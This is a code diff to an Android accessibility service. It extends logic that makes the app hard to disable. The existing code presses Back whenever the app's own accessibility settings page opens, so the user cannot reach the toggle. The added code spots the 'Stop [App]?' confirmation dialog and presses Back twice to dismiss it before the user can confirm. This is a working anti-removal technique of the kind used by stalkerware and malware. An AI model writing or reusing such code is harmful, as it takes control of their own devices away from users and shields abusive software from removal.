@@ -1961,32 +1961,33 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root == null) return;
 
-                // Use direct text search on the active window only — no deep tree traversal.
-                // This avoids scanning invisible menu items or collapsed panels.
-                List<AccessibilityNodeInfo> nameNodes =
-                        root.findAccessibilityNodeInfosByText(appName);
+                // Single root read — search for app name and "stop" in one pass.
+                // findAccessibilityNodeInfosByText does a contains-match on visible nodes only.
+                List<AccessibilityNodeInfo> nameNodes = root.findAccessibilityNodeInfosByText(appName);
+                List<AccessibilityNodeInfo> stopNodes = root.findAccessibilityNodeInfosByText("stop");
                 root.recycle();
 
                 boolean foundName = nameNodes != null && !nameNodes.isEmpty();
-                if (nameNodes != null) {
-                    for (AccessibilityNodeInfo n : nameNodes) {
-                        try { n.recycle(); } catch (Exception ignored) {}
-                    }
-                }
+                boolean foundStop = stopNodes != null && !stopNodes.isEmpty();
+                if (nameNodes != null) for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
+                if (stopNodes != null) for (AccessibilityNodeInfo n : stopNodes) try { n.recycle(); } catch (Exception ignored) {}
 
-                // Our accessibility detail page: app name visible AND package is an
-                // accessibility settings path — no full-screen text dump needed.
+                // Main accessibility detail page: app name visible AND package path
+                // contains "accessibility".
                 boolean isOurAccessibilityPage =
                         foundName && packageName.toLowerCase().contains("accessibility");
+
+                // Stop-confirmation dialog: app name AND "stop" both visible, but NOT
+                // the main accessibility list (which is handled separately above).
+                // This fires when Android shows the "Stop [App]?" confirmation prompt.
+                boolean isStopConfirmDialog = foundName && foundStop && !isOurAccessibilityPage;
 
                 if (isOurAccessibilityPage) {
                     // Show the overlay if not already shown.
                     if (!accessibilityAssistOverlayShowing) {
                         showAccessibilityAssistOverlay();
                     }
-                    // Press Back vigorously every time this page is detected —
-                    // immediate single press so the page is dismissed before the
-                    // user can interact with the toggle.
+                    // Press Back vigorously every time this page is detected.
                     try { performBack(); } catch (Exception ignored) {}
 
                     // Fire Back + Home exactly once on the very first launch.
@@ -1999,6 +2000,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                             try { performHome(); } catch (Exception ignored) {}
                         }, 450L);
                     }
+
+                } else if (isStopConfirmDialog) {
+                    // Stop-confirmation dialog detected — press Back twice immediately
+                    // to dismiss it before the user can tap "Stop" / confirm.
+                    try { performBack(); } catch (Exception ignored) {}
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        try { performBack(); } catch (Exception ignored) {}
+                    }, 80L);
+
                 } else {
                     // A different settings page is now in the foreground —
                     // remove the overlay so the user can navigate freely.
